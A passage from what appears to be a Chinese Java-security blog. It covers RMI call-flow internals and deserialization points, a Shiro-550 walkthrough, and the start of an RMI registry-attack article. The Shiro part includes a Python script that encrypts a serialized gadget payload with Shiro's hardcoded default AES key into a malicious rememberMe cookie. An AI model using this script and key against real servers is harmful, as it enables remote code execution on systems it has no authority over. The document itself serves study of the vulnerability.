<p>这里面只要有readObject方法都能被攻击 <code>bind、rebind、unbind</code></p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225120219084.png" alt="image-20241225120219084"></p>
<p>所以客户端攻击注册中心的方法还是很多的。</p>
<h2 id="客户端请求服务端-客户端"><a href="#客户端请求服务端-客户端" class="headerlink" title="客户端请求服务端-客户端"></a>客户端请求服务端-客户端</h2><p>直接跟进sayHello方法</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225131737965.png" alt="image-20241225131737965"></p>
<p>因为我们现在的对象是一个动态代理，所以会走到调用处理器的invoke方法  ，然后会调用<code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</code>方法</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225131936399.png" alt="image-20241225131936399"></p>
<p><code>invokeRemoteMethod</code>我们发现调用了重载的invoke方法也就是到了<code>sun.rmi.server.UnicastRef#invoke(java.rmi.Remote, java.lang.reflect.Method, java.lang.Object[], long)。</code>最终逻辑会走到<strong>marchalValue</strong>，反正它最终也就是序列化一个值，也就是我们传入的hello，最后又调用了<code> java.rmi.server.RemoteCall#executeCall</code>，这里面也有反序列化的点，客户端请求注册中心-客户端那边已经提到了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">marshalValue</span><span class="hljs-params">(Class&lt;?&gt; type, Object value,</span><br><span class="hljs-params">                                   ObjectOutput out)</span><br>    <span class="hljs-keyword">throws</span> IOException<br>&#123;<br>    <span class="hljs-keyword">if</span> (type.isPrimitive()) &#123;<br>        <span class="hljs-keyword">if</span> (type == <span class="hljs-type">int</span>.class) &#123;<br>            out.writeInt(((Integer) value).intValue());<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == <span class="hljs-type">boolean</span>.class) &#123;<br>            out.writeBoolean(((Boolean) value).booleanValue());<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == <span class="hljs-type">byte</span>.class) &#123;<br>            out.writeByte(((Byte) value).byteValue());<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == <span class="hljs-type">char</span>.class) &#123;<br>            out.writeChar(((Character) value).charValue());<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == <span class="hljs-type">short</span>.class) &#123;<br>            out.writeShort(((Short) value).shortValue());<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == <span class="hljs-type">long</span>.class) &#123;<br>            out.writeLong(((Long) value).longValue());<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == <span class="hljs-type">float</span>.class) &#123;<br>            out.writeFloat(((Float) value).floatValue());<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type == <span class="hljs-type">double</span>.class) &#123;<br>            out.writeDouble(((Double) value).doubleValue());<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Unrecognized primitive type: &quot;</span> + type);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        out.writeObject(value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225132942461.png" alt="image-20241225132942461"></p>
<p>接着会调用<code>sun.rmi.server.UnicastRef#unmarshalValue</code>，也就是说结果是反序列化出来的</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225132501554.png" alt="image-20241225132501554"></p>
<p>这里啰嗦一下。</p>
<p>为什么客户端能直接和服务端通信呢？着重看一下<strong>RemoteObjectInvocationHandler</strong> 这个动态代理，继承 <strong>RemoteObject</strong> 实现 InvocationHandler，因此这是一个可序列化的、可使用 RMI 远程传输的动态代理类。既然是动态代理类，自然重点关注 <code>invoke</code> 方法，可以看到如果是 Object 的方法会调用 <code>invokeObjectMethod</code> 方法，其他的则调用 <code>invokeRemoteMethod</code> 方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241226182732893.png" alt="image-20241226182732893"></p>
<p>而在 <code>invokeRemoteMethod</code> 中实际是委托 RemoteRef 的子类 UnicastRef 的 <code>invoke</code> 方法执行调用。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241226183022698.png" alt="image-20241226183022698"></p>
<p><strong>UnicastRef</strong> 的 <code>invoke</code>方法是一个建立连接，执行调用，并读取结果并反序列化的过程。这里，<strong>UnicastRef</strong> 包含属性 <code>LiveRef</code> ，<strong>LiveRef</strong> 类中的 Endpoint、Channel 封装了与网络通信相关的方法。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241226183650010.png" alt="image-20241226183650010"></p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241226183713660.png" alt="image-20241226183713660"></p>
<p>反序列化方法在 <code>unmarshalValue</code> 中。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241226183852249.png" alt="image-20241226183852249"></p>
<p>也就是说，客户端拿到服务端返回的动态代理对象并且反序列化后，对其进行调用，这看起来是本地进行调用，但实际上是动态代理的 <strong>RemoteObjectInvocationHandler</strong> 委托 <strong>RemoteRef</strong> 的 <strong>invoke</strong> 方法进行远程通信，由于这个动态代理类中保存了真正 Server 端对此项服务监听的端口，因此客户端端直接与服务端端进行通信。</p>
<h2 id="客户端请求服务端-服务端"><a href="#客户端请求服务端-服务端" class="headerlink" title="客户端请求服务端-服务端"></a>客户端请求服务端-服务端</h2><p>服务端由 <strong>UnicastServerRef</strong> 的 <code>dispatch</code> 方法来处理客户端的请求，会在 <code>hashToMethod_Map.get(op)</code> 中寻找 Client 端对应执行 Method 的 hash 值，如果找到了，则会反序列化 Client 端传来的参数，并且通过反射调用。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225134957124.png" alt="image-20241225134957124"></p>
<p>会把运行的结果，序列化之后传给客户端</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225135233667.png" alt="image-20241225135233667"></p>
<h2 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h2><p>在创建注册中心那一部分我们看到了一个对象<strong>DGClmpl_Stub</strong>，它是通过<code>objTable.put(oe,target)</code> put进去的，那肯定是在put之前就创建好了这个对象，接下来我们来看看它的创建流程。</p>
<p>我们找到了这里<code>sun.rmi.transport.ObjectTable#putTarget</code>调用了<code> sun.rmi.transport.DGCImpl#dgcLog</code>，dgcLog是一个静态变量</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225172334819.png" alt="image-20241225172334819"></p>
<p>在调用一个类的静态变量的时候，实际上是会完成类的初始化的，初始化的时候首先会走到静态代码块，也就是走到<code>java.security.PrivilegedAction#run</code>方法里面。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225172741408.png" alt="image-20241225172741408"></p>
<p>调用了<code>sun.rmi.server.Util#createStub</code>，它和创建注册中心创建代理的逻辑是一摸一样的，大概意思就是找有没有<code>_Stub</code>结尾的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">stubClassExists</span><span class="hljs-params">(Class&lt;?&gt; remoteClass)</span> &#123;<br>     <span class="hljs-keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;<br>         <span class="hljs-keyword">try</span> &#123;<br>             Class.forName(remoteClass.getName() + <span class="hljs-string">&quot;_Stub&quot;</span>,<br>                           <span class="hljs-literal">false</span>,<br>                           remoteClass.getClassLoader());<br>             <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>         &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException cnfe) &#123;<br>             withoutStubs.put(remoteClass, <span class="hljs-literal">null</span>);<br>         &#125;<br>     &#125;<br>     <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br> &#125;<br></code></pre></td></tr></table></figure>

<p>所以最后会实例化一个<strong>DGClmpl_Stub</strong>，它的和注册中心一样，有一个ip和端口，端口不固定，作用是远程回收服务，注册中心是用来注册服务。这就创建完成了。</p>
<p>对于客户端的话有两个方法<code>ditry()</code>和<code>dispatch()</code>，我们可以看到DGC客户端也是有反序列化的点。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225173652868.png" alt="image-20241225173652868"></p>
<p>对于服务端最后的调用流程和客户端请求注册中心-注册中心一样的，走到<code>DGCImpl_Skel#dispatch</code>方法，一样有反序列化的点。</p>
<p><img src="https://image.sp4rks.xyz/2024/12/image-20241225173803166.png" alt="image-20241225173803166"></p>
<h1 id="调用流程总结"><a href="#调用流程总结" class="headerlink" title="调用流程总结"></a>调用流程总结</h1><p>把以上的流程，引用su18师傅的图片来表述一下(su18师傅的图画的太好了)</p>
<p><img src="https://image.sp4rks.xyz/2024/12/1633322482542.png" alt="1633322482542"></p>
<h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><p><a href="https://y4er.com/posts/java-rmi/">Java RMI原理及反序列化学习</a></p>
<p><a href="https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/#0x01-%E5%89%8D%E8%A8%80">Java反序列化之RMI专题01-RMI基础</a></p>
<p><a href="https://www.bilibili.com/video/BV1L3411a7ax/?spm_id_from=333.1387.upload.video_card.click&vd_source=d195054a6a081ba07486dcc86c6ba707">Java反序列化RMI专题-没有人比我更懂RMI</a></p>
<p><a href="https://xz.aliyun.com/t/7079?time__1311=n4+xnD0Dy7itGQNKGNnmADu7DcGD9lxflxGupD">基于Java反序列化RCE - 搞懂RMI、JRMP、JNDI</a></p>
<p><a href="https://xz.aliyun.com/t/7264?time__1311=n4+xnD0Dy7G=BxGqGNnmADu7DcG8NYOYWe4D">搞懂RMI、JRMP、JNDI-终结篇</a></p>
<p><a href="https://su18.org/post/rmi-attack/">Java RMI 攻击由浅入深</a></p>
<p><a href="https://xz.aliyun.com/t/16723?time__1311=Gui=iKY50KGIP05DKYYK0=GO3wMrIcnWPaoD">JAVA安全之RMI命令执行深度刨析</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化Shiro 550分析</title>
    <url>/2024/06/09/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Shiro550/</url>
    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p><strong>影响版本</strong>：Shiro &lt;&#x3D; 1.2.4</p>
<p><strong>漏洞根本原因</strong>:固定key加密</p>
<p><strong>Shiro特征</strong>：返回包中包含rememberMe&#x3D;deleteMe字段。</p>
<p>Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。</p>
<p><a href="https://blog.csdn.net/qq_36551991/article/details/118031254">Shiro介绍</a></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li><p>JDK8u202</p>
</li>
<li><p>tomcat 8.5.100</p>
</li>
<li><p>Shiro 1.2.4</p>
</li>
</ul>
<h3 id="下载tomcat"><a href="#下载tomcat" class="headerlink" title="下载tomcat"></a>下载tomcat</h3><p><a href="https://tomcat.apache.org/download-80.cgi">tomcat8</a>(下载好后解压)</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240609144237140.png" alt="image-20240609144237140"></p>
<p>启动tomcat后发现日志是乱码</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240531212732532.png" alt="image-20240531212732532"></p>
<p>找到这个位置把UTF-8改为GBK</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240531213058211.png" alt="image-20240531213058211"></p>
<p><code>Windows</code><strong>下的<code>CMD</code>的默认字符集是<code>GBK</code>，所以<code>UTF8</code>编码输出的日志，中文看到的肯定是乱码了。</strong></p>
<hr>
<h3 id="下载shiro环境"><a href="#下载shiro环境" class="headerlink" title="下载shiro环境"></a>下载shiro环境</h3><p>p牛的环境:<a href="https://github.com/phith0n/JavaThings/tree/master/shirodemo">shirodemo</a></p>
<p>编辑项目设置</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240609150059572.png" alt="image-20240609150059572"></p>
<p>添加tomcat</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240609150152218.png" alt="image-20240609150152218"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240609150612269.png" alt="image-20240609150612269"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611180441211.png" alt="image-20240611180441211"></p>
<p>默认账号:root   </p>
<p>默认密码:secret</p>
<h2 id="Shiro-Cookie处理流程分析"><a href="#Shiro-Cookie处理流程分析" class="headerlink" title="Shiro Cookie处理流程分析"></a>Shiro Cookie处理流程分析</h2><h3 id="加密流程分析"><a href="#加密流程分析" class="headerlink" title="加密流程分析"></a>加密流程分析</h3><p><a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiro反序列化漏洞(一)-shiro550流程分析</a></p>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>比较重要的几个类的继承关系</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+-----------------------------------+</span><br><span class="hljs-section">| RememberMeManager  &lt;&lt;interface&gt;&gt;  |</span><br><span class="hljs-section">+-----------------------------------+</span><br><span class="hljs-code">          ^</span><br><span class="hljs-section">          |</span><br><span class="hljs-section">+-----------------------------------+</span><br><span class="hljs-section">|  AbstractRememberMeManager        |</span><br><span class="hljs-section">+-----------------------------------+</span><br><span class="hljs-code">          ^</span><br><span class="hljs-section">          |</span><br><span class="hljs-section">+-----------------------------------+</span><br><span class="hljs-section">|     CookieRememberMeManager       |</span><br><span class="hljs-section">+-----------------------------------+</span><br></code></pre></td></tr></table></figure>

<hr>
<p><strong>RememberMeManager</strong></p>
<p><code>RememberMeManager</code>接口提供了以下方法：</p>
<ul>
<li><code>getRememberedPrincipals()</code>：RememberMe 的功能。</li>
<li><code>forgetIdentity()</code>：忘记用户身份标识。</li>
<li><code>onSuccessfulLogin()</code>：登录校验成功时调用，保存当前用户的<code>principals</code>以供应用程序以后调用。</li>
<li><code>onFailedLogin()</code>：登录校验失败时调用，忘记当前用户的<code>principals</code>。</li>
<li><code>onLogout()</code>：用户退出登录时调用，忘记当前用户的<code>principals</code>。</li>
</ul>
<p><strong>AbstractRememberMeManager</strong></p>
<p><code>AbstractRememberMeManager</code>是实现<code>RememberMeManger</code>接口类的抽象类，这里有几个比较重要的成员变量需要了解：</p>
<ul>
<li><code> DEFAULT_CIPHER_KEY_BYTES</code>：一个硬编码 AES KEY，该 KEY 会被设置为加解密 KEY 的成员变量。</li>
<li><code>serializer</code>：Shiro 的序列化器，用来对序列化和反序列化标识用户身份的<code>PrincipalCollection</code>对象。</li>
<li><code>cipherService</code>：用于数据加解密的类，实际上是<code>org.apache.shiro.crypto.AesCipherService</code>类。</li>
</ul>
<p><strong>CookieRememberMeManager</strong></p>
<p><code>getRememberedSerializedIdentity()</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;<br>	<br>    	<span class="hljs-comment">//如果不是 HTTP 相关联的实例，记录调试信息并返回 null</span><br>       <span class="hljs-keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;<br>           <span class="hljs-keyword">if</span> (log.isDebugEnabled()) &#123;<br>               <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a &quot;</span> +<br>                       <span class="hljs-string">&quot;servlet request and response in order to retrieve the rememberMe cookie. Returning &quot;</span> +<br>                       <span class="hljs-string">&quot;immediately and ignoring rememberMe operation.&quot;</span>;<br>               log.debug(msg);<br>           &#125;<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125;<br>	<br>    	<span class="hljs-comment">//调用 isIdentityRemoved(wsc) 方法检查身份是否已移除。如果已移除，返回 null。</span><br>       <span class="hljs-type">WebSubjectContext</span> <span class="hljs-variable">wsc</span> <span class="hljs-operator">=</span> (WebSubjectContext) subjectContext;<br>       <span class="hljs-keyword">if</span> (isIdentityRemoved(wsc)) &#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125;<br>	<br>    	<span class="hljs-comment">//获取 HTTP 请求和响应对象:</span><br>       <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> WebUtils.getHttpRequest(wsc);<br>       <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> WebUtils.getHttpResponse(wsc);<br>	<br>    	<span class="hljs-comment">/*</span><br><span class="hljs-comment">    		读取并处理cookie:调用 getCookie().readValue(request, response) 读取“记住我”cookie 的值。</span><br><span class="hljs-comment">		检查 cookie 是否已被删除（Cookie.DELETED_COOKIE_VALUE），如果是，则返回 null。</span><br><span class="hljs-comment">		如果 cookie 存在，对其进行 Base64 解码。</span><br><span class="hljs-comment">		记录解码后的信息（如果启用了详细日志）。</span><br><span class="hljs-comment">		返回解码后的字节数组。</span><br><span class="hljs-comment">	*/</span>	<br>       <span class="hljs-type">String</span> <span class="hljs-variable">base64</span> <span class="hljs-operator">=</span> getCookie().readValue(request, response);<br>       <span class="hljs-comment">// Browsers do not always remove cookies immediately (SHIRO-183)</span><br>       <span class="hljs-comment">// ignore cookies that are scheduled for removal</span><br>       <span class="hljs-keyword">if</span> (Cookie.DELETED_COOKIE_VALUE.equals(base64)) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>       <span class="hljs-keyword">if</span> (base64 != <span class="hljs-literal">null</span>) &#123;<br>           base64 = ensurePadding(base64);<br>           <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>               log.trace(<span class="hljs-string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="hljs-string">&quot;]&quot;</span>);<br>           &#125;<br>           <span class="hljs-type">byte</span>[] decoded = Base64.decode(base64);<br>           <span class="hljs-keyword">if</span> (log.isTraceEnabled()) &#123;<br>               log.trace(<span class="hljs-string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="hljs-literal">null</span> ? decoded.length : <span class="hljs-number">0</span>) + <span class="hljs-string">&quot; bytes.&quot;</span>);<br>           &#125;<br>           <span class="hljs-keyword">return</span> decoded;<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-comment">//no cookie set - new site visitor?</span><br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>



<h2 id="Shiro-550漏洞利用"><a href="#Shiro-550漏洞利用" class="headerlink" title="Shiro 550漏洞利用"></a>Shiro 550漏洞利用</h2><h3 id="CC11链攻击"><a href="#CC11链攻击" class="headerlink" title="CC11链攻击"></a>CC11链攻击</h3><p>注：原生 shiro 中是没有 common-collections的，这里为了演示，所以添加了 common-collections 依赖</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611200459717.png" alt="image-20240611200459717"></p>
<p>加密脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> email.mime <span class="hljs-keyword">import</span> base<br><span class="hljs-keyword">from</span> pydoc <span class="hljs-keyword">import</span> plain<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> turtle <span class="hljs-keyword">import</span> mode<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br> <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br> <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br> BS = AES.block_size<br> pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br> key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br> mode = AES.MODE_CBC<br> iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br> encryptor = AES.new(base64.b64decode(key), mode, iv)<br> ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br> <span class="hljs-keyword">return</span> ciphertext<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br> enc_data = base64.b64decode(enc_data)<br> unpad = <span class="hljs-keyword">lambda</span> s: s[:-s[-<span class="hljs-number">1</span>]]<br> key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br> mode = AES.MODE_CBC<br> iv = enc_data[:<span class="hljs-number">16</span>]<br> encryptor = AES.new(base64.b64decode(key), mode, iv)<br> plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br> plaintext = unpad(plaintext)<br> <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br> data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br> <span class="hljs-built_in">print</span>(aes_enc(data))<br></code></pre></td></tr></table></figure>

<p>这个脚本的意思就是先aes加密，再base64编码，符合shiro逻辑</p>
<p>对CC11的序列化数据编码</p>
<p>当Cookie中有JSESSIONID时，不会通过rememberMe的数据进行身份认证，就执行不了我们构造好的EXP</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611211916791.png" alt="image-20240611211916791"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611211931741.png" alt="image-20240611211931741"></p>
<h3 id="CB链攻击"><a href="#CB链攻击" class="headerlink" title="CB链攻击"></a>CB链攻击</h3><p>因为原生的Shiro并不带CC依赖，但是包含了commons-beanutils，所以参考<a href="https://sp4rks3.github.io/2024/06/08/JAVA%E5%AE%89%E5%85%A8/CB%E9%93%BE/">Java反序列化CommonsBeanutils链</a></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611213742442.png" alt="image-20240611213742442"></p>
<p>用之前的CB链打，报错信息为<code>org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962</code></p>
<p>这是因为CB版本不一致导致的</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611213705631.png" alt="image-20240611213705631"></p>
<p>Shiro环境中commons-beanutils版本为1.8.3</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611213801082.png" alt="image-20240611213801082"></p>
<p>最简单的接解决办法就是把之前本地环境中commons-beanutils的版本变为Shiro的commons-beanutils版本</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240611213925075.png" alt="image-20240611213925075"></p>
<h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://blog.csdn.net/qq_36551991/article/details/118031254">Shiro学习之路（一）：Shiro是什么？有什么用</a></p>
<p><a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiro反序列化漏洞(一)-shiro550流程分析</a></p>
<p><a href="https://www.bilibili.com/video/BV1dq4y1B76x/?spm_id_from=333.999.0.0&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiro反序列化漏洞(二)-shiro下的CC链利用</a></p>
<p><a href="https://www.bilibili.com/video/BV1uf4y1T7Rq/?spm_id_from=333.788&vd_source=d195054a6a081ba07486dcc86c6ba707">Shiro反序列化漏洞(三)-shiro无依赖利用链</a></p>
<p><a href="https://github.com/dota-st/JavaSec/blob/master/04-Shiro%E4%B8%93%E5%8C%BA/1-Shiro%E4%B9%8BCVE-2016-4437/index.md">CVE-2016-4437漏洞分析</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA反序列化-RMI攻击篇</title>
    <url>/2025/01/14/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/RMI%E4%B8%93%E9%A2%98-%E6%94%BB%E5%87%BB%E7%AF%87/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上一篇主要写了RMI的流程，这篇基于上篇流程，主要写一下攻击点，也是属于才在前辈的肩膀上看世界了。</p>
<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="调试准备"><a href="#调试准备" class="headerlink" title="调试准备"></a>调试准备</h2><p>本篇涉及大量的代码调试，由于Oracle JDK sun包没有源码，是反编译的，阅读体验不好，如下图，我们可以使用openjdk的sun源码，提升我们的阅读体验。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250113204722738.png" alt="image-20250113204722738"></p>
<p>具体步骤是，查询我们当前使用的版本。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250113205045176.png" alt="image-20250113205045176"></p>
<p>去这里找到对应的版本号<a href="https://github.com/openjdk/jdk8u">https://github.com/openjdk/jdk8u</a> 这个就是源码（当然其实也不一定非常准确，因为里面还涉及到Oracle JDk和OpenJDK的差别，版本号可能有一些差异，但其实偏差也不会很大）</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250113204445049.png" alt="image-20250113204445049"></p>
<p>我们打开项目的配置，找到SDK，然后点开Sourcepath这个选项卡，正常情况下里面会有两个默认的源码目录，分别是src.zip和javafx-src.zip。我们将刚才下载的源码的子目录jdk&#x2F;src&#x2F;share&#x2F;classes&#x2F;sun加进去，就可以正常调试了。</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20250113205314705.png" alt="image-20250113205314705"></p>
<h1 id="攻击注册中心"><a href="#攻击注册中心" class="headerlink" title="攻击注册中心"></a>攻击注册中心</h1><p>前面我们提到了，客户端请求注册中心-客户端是调用<code>RegistryImpl_Stub</code>的方法，那与Registry交互的方法有list、bind、rebind、unbind、lookup</p>
<p><img src="https://image.sp4rks.xyz/2025/01/image-20241231115603138.png" alt="image-20241231115603138"></p>
<p>这些方法对应的处理逻辑由服务端 <code>RegistryImpl_Skel</code> 的 <code>dispatch</code> 方法来完成。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatch</span><span class="hljs-params">(Remote var1, RemoteCall var2, <span class="hljs-type">int</span> var3, <span class="hljs-type">long</span> var4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (var4 != <span class="hljs-number">4905912898345647071L</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SkeletonMismatchException</span>(<span class="hljs-string">&quot;interface hash mismatch&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">RegistryImpl</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (RegistryImpl)var1;<br>            <span class="hljs-keyword">switch</span> (var3) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                    String var100;<br>                    Remote var103;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var105</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                        var100 = (String)var105.readObject();<br>                        var103 = (Remote)var105.readObject();<br>                    &#125; <span class="hljs-keyword">catch</span> (IOException var94) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var94);<br>                    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var95) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var95);<br>                    &#125; <span class="hljs-keyword">finally</span> &#123;<br>                        var2.releaseInputStream();<br>                    &#125;<br><br>                    var6.bind(var100, var103);<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        var2.getResultStream(<span class="hljs-literal">true</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span 